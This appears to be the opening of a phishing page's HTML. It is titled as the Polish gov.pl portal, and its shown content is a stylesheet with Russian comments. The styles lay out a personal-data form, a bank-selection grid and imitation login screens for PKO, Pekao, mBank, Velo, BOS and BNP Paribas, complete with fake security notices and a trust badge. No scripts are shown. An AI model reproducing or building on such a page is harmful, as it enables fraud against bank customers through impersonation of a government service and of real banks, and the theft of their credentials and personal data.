<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
    <style>
        /* ============================================================
           ПОЛНЫЙ CSS (сокращён для экономии места, все стили сохранены)
           ============================================================ */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: #f5f7fb; color: #1a1a1a; line-height: 1.6; overflow-x: hidden; scroll-behavior: smooth; }
        a { text-decoration: none; color: inherit; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .header { background: #ffffff; width: 100%; height: 72px; border-bottom: 2px solid #e6ebf3; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; position: fixed; top: 0; left: 0; z-index: 1001; transition: all 0.3s; }
        .header-left { display: flex; align-items: center; transition: all 0.3s; overflow: hidden; }
        .header-right { display: flex; align-items: center; gap: 12px; margin-right: 15px; transition: all 0.3s; overflow: hidden; }
        .menu-btn { width: 70px; height: 70px; background: transparent; border: none; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px; cursor: pointer; transition: background 0.2s; flex-shrink: 0; margin-right: 12px; padding: 0; z-index: 1002; }
        .menu-btn:hover { background: rgba(0, 0, 0, 0.03); }
        .menu-btn .line { display: block; width: 30px; height: 3px; background: #888; border-radius: 2px; transition: all 0.2s; flex-shrink: 0; }
        .logo-area { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; transition: all 0.3s; }
        .logo-area .coat-of-arms { height: 40px; width: auto; display: block; flex-shrink: 0; }
        .logo-area .logo-main { display: flex; align-items: baseline; gap: 8px; }
        .logo-area .logo-main .gov { font-size: 24px; font-weight: 700; color: #1a1a1a; letter-spacing: -0.5px; }
        .logo-area .logo-main .separator { font-size: 26px; font-weight: 600; color: #cc0000; line-height: 1; }
        .logo-area .logo-main .subtitle { font-size: 16px; font-weight: 400; color: #555; }
        .header-search { display: flex; align-items: center; background: #f0f4fa; border: 1px solid #d0d8e4; overflow: hidden; transition: border-color 0.2s, box-shadow 0.2s; height: 44px; border-radius: 4px; min-width: 340px; }
        .header-search:focus-within { border-color: #003b6f; box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.15); }
        .header-search .search-icon-btn { background: transparent; border: none; padding: 0 12px 0 14px; height: 100%; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .header-search .search-icon-btn svg { width: 18px; height: 18px; fill: none; stroke: #555; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; transition: stroke 0.2s; }
        .header-search .search-icon-btn:hover svg { stroke: #003b6f; }
        .header-search input { border: none; outline: none; padding: 0 12px 0 0; font-size: 14px; background: transparent; color: #1a1a1a; min-width: 180px; height: 100%; flex: 1; }
        .header-search input::placeholder { color: #777; font-weight: 400; }
        .header-search .search-submit-btn { background: #003b6f; border: none; color: #ffffff; font-size: 14px; font-weight: 600; padding: 0 22px; height: 100%; cursor: pointer; transition: background 0.2s; white-space: nowrap; border-radius: 0 4px 4px 0; flex-shrink: 0; }
        .header-search .search-submit-btn:hover { background: #002a4f; }
        .header-eu-logo { width: 72px; height: 44px; flex-shrink: 0; display: block; }
        .header-eu-logo img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .main-wrapper { display: flex; gap: 0; align-items: flex-start; padding: 0; width: 100%; margin-top: 72px; transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); position: relative; z-index: 1; }
        .main-wrapper.shifted { margin-left: 100px; }
        .sidebar { min-width: 268px; max-width: 268px; background: #ffffff; border-right: 1px solid #e6ebf3; padding: 16px 0; height: calc(100vh - 72px); overflow-y: auto; position: fixed; top: 72px; left: -268px; z-index: 1000; transition: left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); box-shadow: 4px 0 20px rgba(0, 0, 0, 0.05); }
        .sidebar.open { left: 0; }
        .sidebar::-webkit-scrollbar { width: 4px; }
        .sidebar::-webkit-scrollbar-track { background: #f0f0f0; }
        .sidebar::-webkit-scrollbar-thumb { background: #c0c8d4; border-radius: 4px; }
        .sidebar-nav ul { list-style: none; padding: 0; margin: 0; }
        .sidebar-nav ul li a { display: flex; align-items: center; gap: 12px; padding: 9px 20px; color: #1a1a1a; font-size: 16px; font-weight: 400; border-bottom: 1px solid #f0f2f5; transition: background 0.2s, color 0.2s; text-decoration: none; }
        .sidebar-nav ul li a:hover { background: #eef4fc; color: #4a7ba7; }
        .sidebar-nav ul li a.active { background: #4a7ba7; color: #ffffff; font-weight: 400; }
        .sidebar-nav ul li a.active:hover { background: #3a6a94; color: #ffffff; }
        .sidebar-nav ul li a .menu-icon { width: 20px; height: 22px; flex-shrink: 0; display: block; }
        .sidebar-nav ul li a .menu-icon img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .sidebar-nav .separator { border-bottom: 1px solid #bcc3cd; margin: 6px 16px; padding: 0; }
        .sidebar-nav .separator:last-of-type { display: none; }
        .sidebar-nav .ukraine-link { display: flex; align-items: center; gap: 8px; padding: 9px 20px; color: #1a1a1a; font-size: 13px; font-weight: 400; border-bottom: none; transition: background 0.2s, color 0.2s; text-decoration: none; line-height: 1.3; }
        .sidebar-nav .ukraine-link:hover { background: #eef4fc; color: #4a7ba7; }
        .sidebar-nav .ukraine-link .flag-icon { width: 24px; height: 16px; flex-shrink: 0; display: block; }
        .sidebar-nav .ukraine-link .flag-icon img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .content-wrapper { flex: 1; min-width: 0; transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
        .content-wrapper.shifted { margin-left: 100px; }
        .login-nav { width: 100%; background: #ffffff; border-bottom: 1px solid #e6ebf3; padding: 10px 30px; display: flex; align-items: center; flex-wrap: wrap; gap: 40px 20px; transition: opacity 0.3s, max-height 0.3s; overflow: hidden; max-height: 200px; opacity: 1; }
        .login-nav.hidden { max-height: 0; opacity: 0; padding: 0 30px; border-bottom: none; margin: 0; }
        .login-nav .brand { font-size: 20px; font-weight: 700; color: #000000; letter-spacing: -0.3px; white-space: nowrap; margin-left: 450px; }
        .login-nav .nav-links { display: flex; align-items: center; gap: 24px; flex-wrap: wrap; margin-left: 40px; }
        .login-nav .nav-links a { font-size: 15px; font-weight: 500; color: #1a1a1a; transition: color 0.2s; white-space: nowrap; }
        .login-nav .nav-links a:hover { color: #003b6f; text-decoration: underline; }
        .image-under-banner { width: 100%; padding: 12px 0; background: #ffffff; border-bottom: 1px solid #e6ebf3; display: flex; justify-content: center; align-items: center; position: relative; transition: opacity 0.3s, max-height 0.3s; overflow: hidden; max-height: 800px; opacity: 1; }
        .image-under-banner.hidden { max-height: 0; opacity: 0; padding: 0; border-bottom: none; margin: 0; }
        .image-under-banner .image-wrapper { position: relative; display: inline-block; max-width: 100%; }
        .image-under-banner .image-wrapper img { max-width: 100%; height: auto; display: block; }
        .image-under-banner .image-wrapper .overlay-icon { position: absolute; top: 50%; left: 400px; transform: translateY(-50%); width: 176px; height: 145px; opacity: 0.9; pointer-events: none; }
        .image-under-banner .image-wrapper .overlay-icon img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .image-under-banner .image-wrapper .overlay-line { position: absolute; top: 10%; bottom: 10%; left: 600px; width: 2px; background: linear-gradient(to bottom, #888888, #222222, #888888); opacity: 0.5; pointer-events: none; border-radius: 2px; }
        .image-under-banner .image-wrapper .overlay-text { position: absolute; top: 50%; left: 630px; transform: translateY(-50%); pointer-events: none; max-width: 420px; }
        .image-under-banner .image-wrapper .overlay-text h2 { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; line-height: 1.2; }
        .image-under-banner .image-wrapper .overlay-text p { font-size: 16px; color: #333; margin-bottom: 16px; line-height: 1.5; }
        .image-under-banner .image-wrapper .overlay-text .btn-outline { display: inline-block; padding: 10px 28px; border: 2px solid #1a1a1a; color: #1a1a1a; font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; border-radius: 4px; transition: background 0.2s, color 0.2s; pointer-events: auto; cursor: pointer; background: transparent; }
        .image-under-banner .image-wrapper .overlay-text .btn-outline:hover { background: #1a1a1a; color: #ffffff; }
        .data-form-section { background: #ffffff; padding: 30px 40px 40px; border-bottom: 1px solid #e6ebf3; scroll-margin-top: 80px; display: block; transition: opacity 0.3s, max-height 0.3s; overflow: hidden; max-height: 2000px; opacity: 1; }
        .data-form-section.hidden { max-height: 0; opacity: 0; padding: 0 40px; border-bottom: none; margin: 0; }
        .data-form-section .section-title { font-size: 22px; font-weight: 700; color: #003b6f; margin-bottom: 20px; border-bottom: 2px solid #e6ebf3; padding-bottom: 12px; }
        .blue-alert { background: #e8f0fe; border-left: 4px solid #003b6f; padding: 20px 24px; margin-bottom: 24px; border-radius: 4px; color: #003b6f; font-size: 18px; line-height: 1.6; }
        .blue-alert strong { color: #002a4f; }
        .blue-alert .alert-icon { font-size: 22px; margin-right: 12px; }
        .data-form { display: grid; grid-template-columns: 1fr 1fr; gap: 18px 30px; }
        .data-form .form-group { display: flex; flex-direction: column; }
        .data-form .form-group.full-width { grid-column: 1 / -1; }
        .data-form .form-group label { font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .data-form .form-group label .required { color: #cc0000; margin-left: 2px; }
        .data-form .form-group input, .data-form .form-group select { padding: 10px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 4px; background: #f8faff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
        .data-form .form-group input:focus, .data-form .form-group select:focus { border-color: #003b6f; box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12); outline: none; background: #ffffff; }
        .data-form .form-group input::placeholder { color: #999; }
        .data-form .form-group input.error { border-color: #cc0000; background: #fff5f5; }
        .data-form .address-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 10px; }
        .data-form .address-row input { width: 100%; }
        .data-form .form-actions { grid-column: 1 / -1; display: flex; justify-content: flex-end; margin-top: 6px; }
        .data-form .submit-btn { background: #003b6f; color: #ffffff; border: none; padding: 12px 40px; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; transition: background 0.2s; }
        .data-form .submit-btn:hover { background: #002a4f; }
        .data-form .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .data-form .submit-btn .spinner { display: none; width: 18px; height: 18px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; }
        .data-form .submit-btn.loading .spinner { display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .bank-selection { display: none; background: #ffffff; padding: 60px 40px 20px; min-height: calc(100vh - 72px); width: 100%; position: relative; z-index: 2; }
        .bank-selection.visible { display: block; }
        .bank-selection .bank-title { font-size: 32px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
        .bank-selection .bank-subtitle { font-size: 18px; color: #555; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; max-width: 660px; }
        .bank-btn { width: 191px; height: 80px; border: 2px solid #003b6f; border-radius: 8px; background: #ffffff; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s; padding: 14px; }
        .bank-btn:hover { border-color: #002a4f; box-shadow: 0 4px 16px rgba(0, 59, 111, 0.15); transform: scale(1.02); }
        .bank-btn img { width: 162px; height: 52px; object-fit: contain; display: block; }
        .bank-footer { display: none; width: 100%; padding: 60px 0 30px; background: #ffffff; border-top: 1px solid #e6ebf3; text-align: center; }
        .bank-footer.visible { display: block; }
        .bank-footer .footer-links { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
        .bank-footer .footer-links a { font-size: 13px; color: #999; transition: color 0.2s; }
        .bank-footer .footer-links a:hover { color: #555; text-decoration: underline; }
        
        /* BANK 1 — PKO */
        .login-screen { display: none; background: #ffffff; min-height: calc(100vh - 72px); width: 100%; padding: 40px 30px 30px; position: relative; z-index: 2; }
        .login-screen.visible { display: block; }
        .login-screen .login-container { max-width: 1000px; margin: 0 auto; display: flex; flex-direction: column; }
        .login-screen .login-grid { display: flex; gap: 60px; align-items: flex-start; width: 100%; }
        .login-screen .login-left { flex: 1; max-width: 480px; }
        .login-screen .login-right { flex: 1; max-width: 400px; padding-top: 10px; }
        .login-screen .login-left .ipko-logo { width: 75px; height: 56px; display: block; margin-bottom: 12px; }
        .login-screen .login-left .ipko-logo img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .login-screen .login-title { font-size: 28px; font-weight: 400; color: #1a1a1a; margin-bottom: 4px; }
        .login-screen .login-subtitle { font-size: 16px; color: #555; margin-bottom: 24px; }
        .login-screen .login-form .form-group { margin-bottom: 16px; }
        .login-screen .login-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .login-screen .login-form input { width: 100%; padding: 10px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 4px; background: #f8faff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
        .login-screen .login-form input:focus { border-color: #003b6f; box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12); outline: none; background: #ffffff; }
        .login-screen .login-form .login-btn { width: 135px; height: 40px; padding: 0 20px; background: #0072b0; color: #ffffff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; flex-shrink: 0; white-space: nowrap; margin-top: 6px; }
        .login-screen .login-form .login-btn:hover { background: #005a8c; }
        .login-screen .login-form .login-btn-row { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
        .login-screen .login-form .login-btn-row .form-group { flex: 1; min-width: 180px; margin-bottom: 0; }
        .login-screen .security-info { border-left: 3px solid #003b6f; padding-left: 28px; height: 100%; }
        .login-screen .security-info .info-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
        .login-screen .security-info p { font-size: 15px; color: #444; margin-bottom: 8px; line-height: 1.5; }
        .login-screen .security-info .highlight { font-weight: 600; color: #1a1a1a; }
        .login-screen .security-info .security-block { margin-bottom: 16px; }
        .login-screen .security-info .security-block:last-child { margin-bottom: 0; }
        .login-screen .contact-info { border-left: 3px solid #0072b0; padding-left: 28px; height: 100%; }
        .login-screen .contact-info .info-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 16px; }
        .login-screen .contact-info .contact-block { margin-bottom: 18px; }
        .login-screen .contact-info .contact-block:last-child { margin-bottom: 0; }
        .login-screen .contact-info .contact-label { font-weight: 600; color: #1a1a1a; font-size: 15px; margin-bottom: 2px; }
        .login-screen .contact-info .contact-phone { font-size: 18px; font-weight: 700; color: #0072b0; letter-spacing: 0.5px; }
        .login-screen .contact-info .contact-phone-small { font-size: 15px; font-weight: 400; color: #444; margin-top: 2px; }
        .login-screen .contact-info .contact-divider { border: none; border-top: 1px solid #e6ebf3; margin: 16px 0; }
        .login-screen .contact-info .contact-link { color: #0072b0; font-weight: 500; font-size: 15px; cursor: pointer; transition: color 0.2s; }
        .login-screen .contact-info .contact-link:hover { color: #005a8c; text-decoration: underline; }
        
        /* BANK 3 — Pekao */
        .bank3-full-page { display: none; background: url('1234.jpg') center/cover no-repeat; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; }
        .bank3-full-page.visible { display: block; }
        .bank3-full-page::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.85); z-index: 0; }
        .bank3-header { width: 100%; height: 56px; background: #d71920; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; z-index: 2; }
        .bank3-header .bank3-header-content { max-width: 1200px; width: 100%; padding: 0 40px; display: flex; align-items: center; justify-content: flex-start; }
        .bank3-header .bank3-header-content .bank3-logo { display: block; height: 32px; width: auto; }
        .bank3-header .bank3-header-content .bank3-logo img { height: 100%; width: auto; display: block; }
        .bank3-full-page .login-container { position: relative; z-index: 1; display: flex; justify-content: center; align-items: center; min-height: calc(100vh - 56px); padding: 40px 20px; }
        .bank3-full-page .login-form-wrapper { background: #ffffff; border: 3px solid #d71920; border-radius: 16px; padding: 24px 28px 28px; max-width: 420px; width: 100%; margin: 0 auto; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10); }
        .bank3-full-page .login-form-wrapper .login-title { font-size: 28px; font-weight: 400; color: #1a1a1a; margin-bottom: 4px; }
        .bank3-full-page .login-form-wrapper .login-subtitle { font-size: 16px; color: #555; margin-bottom: 20px; }
        .bank3-full-page .login-form-wrapper .form-group { margin-bottom: 16px; }
        .bank3-full-page .login-form-wrapper label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank3-full-page .login-form-wrapper input { width: 100%; padding: 10px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 4px; background: #f8faff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
        .bank3-full-page .login-form-wrapper input:focus { border-color: #003b6f; box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12); outline: none; background: #ffffff; }
        .bank3-full-page .login-form-wrapper .login-btn-row { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 4px; }
        .bank3-full-page .login-form-wrapper .login-btn-row .form-group { flex: 1; min-width: 180px; margin-bottom: 0; }
        .bank3-full-page .login-form-wrapper .login-btn { width: 135px; height: 40px; padding: 0 20px; background: #d71920; color: #ffffff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; flex-shrink: 0; white-space: nowrap; }
        .bank3-full-page .login-form-wrapper .login-btn:hover { background: #b01218; }
        .bank3-full-page .login-form-wrapper .security-warnings { margin-top: 24px; border-top: 1px solid #e6ebf3; padding-top: 18px; }
        .bank3-full-page .login-form-wrapper .security-warnings .warning-item { font-size: 14px; font-weight: 400; color: #555; display: flex; align-items: flex-start; gap: 10px; line-height: 1.4; margin-bottom: 8px; }
        .bank3-full-page .login-form-wrapper .security-warnings .warning-item:last-child { margin-bottom: 0; }
        .bank3-full-page .login-form-wrapper .security-warnings .warning-item .icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; color: #888; }
        .bank3-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10000; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank3-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank3-close-btn.visible { display: flex; }
        
        /* BANK 4 — mBank */
        .bank4-full-page { display: none; background: #f5f5f5; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; }
        .bank4-full-page.visible { display: block; }
        .bank4-full-page .bank4-container { max-width: 500px; margin: 0 auto; padding: 60px 30px; }
        .bank4-full-page .bank4-title { font-size: 32px; font-weight: 300; color: #000000; margin-bottom: 4px; }
        .bank4-full-page .bank4-subtitle { font-size: 16px; color: #555; margin-bottom: 30px; }
        .bank4-full-page .bank4-form .form-group { margin-bottom: 16px; }
        .bank4-full-page .bank4-form label { display: block; font-size: 14px; font-weight: 600; color: #000000; margin-bottom: 4px; }
        .bank4-full-page .bank4-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 2px solid #cccccc; border-radius: 0; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #000000; }
        .bank4-full-page .bank4-form input:focus { border-color: #888888; box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08); outline: none; }
        .bank4-full-page .bank4-form input::placeholder { color: #aaaaaa; }
        .bank4-full-page .bank4-form .login-btn-row { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 4px; }
        .bank4-full-page .bank4-form .login-btn-row .form-group { flex: 1; min-width: 180px; margin-bottom: 0; }
        .bank4-full-page .bank4-form .login-btn { width: 135px; height: 44px; padding: 0 24px; background: #000000; color: #ffffff; border: 2px solid #000000; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s, color 0.2s; flex-shrink: 0; white-space: nowrap; }
        .bank4-full-page .bank4-form .login-btn:hover { background: #333333; border-color: #333333; }
        .bank4-full-page .bank4-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10000; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank4-full-page .bank4-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank4-full-page .bank4-close-btn.visible { display: flex; }
        
        /* BANK 5 — Velo */
        .bank5-full-page { display: none; background: #1a1a1a; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; align-items: center; justify-content: center; }
        .bank5-full-page.visible { display: flex; }
        .bank5-full-page .bank5-container { max-width: 520px; width: 100%; margin: 0 auto; padding: 20px; }
        .bank5-full-page .bank5-box { background: rgb(20, 20, 20); border-radius: 16px; padding: 40px 36px 36px; width: 100%; box-shadow: 0 8px 48px rgba(0, 0, 0, 0.6); }
        .bank5-full-page .bank5-alert { background: rgba(255, 200, 50, 0.12); border-left: 4px solid #f5a623; padding: 14px 18px; border-radius: 6px; margin-bottom: 28px; font-size: 13px; color: #d0d0d0; line-height: 1.5; }
        .bank5-full-page .bank5-alert a { color: #f5a623; font-weight: 500; text-decoration: underline; cursor: pointer; }
        .bank5-full-page .bank5-alert a:hover { color: #ffc84d; }
        .bank5-full-page .bank5-title { font-size: 24px; font-weight: 600; color: #ffffff; margin-bottom: 4px; }
        .bank5-full-page .bank5-subtitle { font-size: 15px; color: #999999; margin-bottom: 24px; }
        .bank5-full-page .bank5-form .form-group { margin-bottom: 16px; }
        .bank5-full-page .bank5-form label { display: block; font-size: 14px; font-weight: 500; color: #cccccc; margin-bottom: 4px; }
        .bank5-full-page .bank5-form input { width: 100%; padding: 12px 16px; font-size: 14px; border: 1px solid #3a3a3a; border-radius: 8px; background: #2a2a2a; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #ffffff; }
        .bank5-full-page .bank5-form input::placeholder { color: #666666; }
        .bank5-full-page .bank5-form input:focus { border-color: #26d655; box-shadow: 0 0 0 3px rgba(38, 214, 85, 0.15); outline: none; background: #2a2a2a; }
        .bank5-full-page .bank5-form .login-btn-row { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; margin-top: 6px; }
        .bank5-full-page .bank5-form .login-btn-row .form-group { flex: 1; min-width: 180px; margin-bottom: 0; }
        .bank5-full-page .bank5-form .login-btn { width: 135px; height: 48px; padding: 0 28px; background: rgb(38, 214, 85); color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s, transform 0.15s; flex-shrink: 0; white-space: nowrap; }
        .bank5-full-page .bank5-form .login-btn:hover { background: #20c04a; transform: scale(1.02); }
        .bank5-full-page .bank5-form .login-btn:active { transform: scale(0.97); }
        .bank5-full-page .bank5-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10000; background: rgba(255, 255, 255, 0.1); color: #ffffff; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 50%; width: 40px; height: 40px; font-size: 20px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank5-full-page .bank5-close-btn:hover { background: rgba(255, 255, 255, 0.2); }
        .bank5-full-page .bank5-close-btn.visible { display: flex; }
        
        /* BANK 6 — BOS */
        .bank6-full-page { display: none; background: #f0f4f8; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; align-items: center; justify-content: center; }
        .bank6-full-page.visible { display: flex; }
        .bank6-container { max-width: 1000px; width: 100%; margin: 0 auto; padding: 40px 30px; display: flex; gap: 50px; align-items: flex-start; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 48px rgba(0, 0, 0, 0.08); border: 1px solid #e6ebf3; }
        .bank6-left { flex: 1; max-width: 420px; }
        .bank6-title { font-size: 28px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
        .bank6-form .form-group { margin-bottom: 18px; }
        .bank6-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank6-form input { width: 100%; padding: 12px 16px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank6-form input:focus { border-color: #005f42; box-shadow: 0 0 0 3px rgba(0, 95, 66, 0.12); outline: none; }
        .bank6-form input::placeholder { color: #999; }
        .bank6-form .login-btn { width: 100%; padding: 14px; background: #005f42; color: #ffffff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s, transform 0.15s; margin-top: 6px; }
        .bank6-form .login-btn:hover { background: #004d35; transform: scale(1.01); }
        .bank6-download { margin-top: 16px; text-align: center; }
        .bank6-download img { width: 200px; height: 44px; object-fit: contain; display: inline-block; }
        .bank6-right { flex: 1; max-width: 460px; padding-top: 4px; }
        .bank6-security-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 16px; }
        .bank6-security-text { font-size: 14px; color: #444; line-height: 1.6; }
        .bank6-security-text p { margin-bottom: 10px; }
        .bank6-security-text .highlight { font-weight: 600; color: #1a1a1a; }
        .bank6-security-text .green { color: #005f42; font-weight: 600; }
        .bank6-security-text ul { list-style: none; padding: 0; margin: 8px 0 12px; }
        .bank6-security-text ul li { padding: 4px 0 4px 20px; position: relative; }
        .bank6-security-text ul li::before { content: '•'; position: absolute; left: 0; color: #005f42; font-weight: 700; }
        .bank6-security-text .link { color: #005f42; font-weight: 600; text-decoration: underline; cursor: pointer; }
        .bank6-security-text .link:hover { color: #004d35; }
        .bank6-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10000; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank6-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank6-close-btn.visible { display: flex; }
        
        /* BANK 7 — BNP PARIBAS */
        .bank7-full-page { display: none; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; background: url('login-bg.jpg') center/cover no-repeat; }
        .bank7-full-page.visible { display: block; }
        .bank7-full-page::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.88); z-index: 0; }
        .bank7-full-page .bank7-container { position: relative; z-index: 1; max-width: 480px; margin: 0 auto; padding: 60px 20px 40px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .bank7-full-page .bank7-logo { margin-bottom: 24px; display: flex; justify-content: center; }
        .bank7-full-page .bank7-logo img { width: 154px; height: 32px; display: block; }
        .bank7-full-page .bank7-box { background: #ffffff; border: 2px solid #e6ebf3; border-radius: 12px; padding: 32px 28px 28px; box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06); }
        .bank7-full-page .bank7-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 2px; }
        .bank7-full-page .bank7-subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
        .bank7-full-page .bank7-form .form-group { margin-bottom: 16px; }
        .bank7-full-page .bank7-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank7-full-page .bank7-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank7-full-page .bank7-form input:focus { border-color: #007548; box-shadow: 0 0 0 3px rgba(0, 117, 72, 0.12); outline: none; }
        .bank7-full-page .bank7-form input::placeholder { color: #999; }
        .bank7-full-page .bank7-form .login-btn { width: 100%; padding: 14px; background: #007548; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s, transform 0.15s; margin-top: 4px; }
        .bank7-full-page .bank7-form .login-btn:hover { background: #005f3a; transform: scale(1.01); }
        .bank7-full-page .bank7-security { margin-top: 20px; padding-top: 18px; border-top: 1px solid #e6ebf3; }
        .bank7-full-page .bank7-security-title { font-size: 13px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
        .bank7-full-page .bank7-security-list { list-style: none; padding: 0; margin: 0 0 12px 0; }
        .bank7-full-page .bank7-security-list li { font-size: 13px; color: #555; padding: 2px 0 2px 20px; position: relative; }
        .bank7-full-page .bank7-security-list li::before { content: '✓'; position: absolute; left: 0; color: #007548; font-weight: 700; }
        .bank7-full-page .bank7-links { display: flex; flex-wrap: wrap; gap: 8px 16px; font-size: 13px; }
        .bank7-full-page .bank7-links a { color: #007548; font-weight: 500; text-decoration: underline; cursor: pointer; }
        .bank7-full-page .bank7-links a:hover { color: #005f3a; }
        .bank7-full-page .bank7-links .separator { color: #ccc; }
        .bank7-full-page .bank7-chat { margin-top: 6px; font-size: 13px; color: #555; }
        .bank7-full-page .bank7-chat a { color: #007548; font-weight: 500; text-decoration: underline; cursor: pointer; }
        .bank7-full-page .bank7-chat a:hover { color: #005f3a; }
        .bank7-full-page .bank7-norton { position: fixed; bottom: 20px; right: 30px; z-index: 10001; }
        .bank7-full-page .bank7-norton img { width: 69px; height: 47px; display: block; }
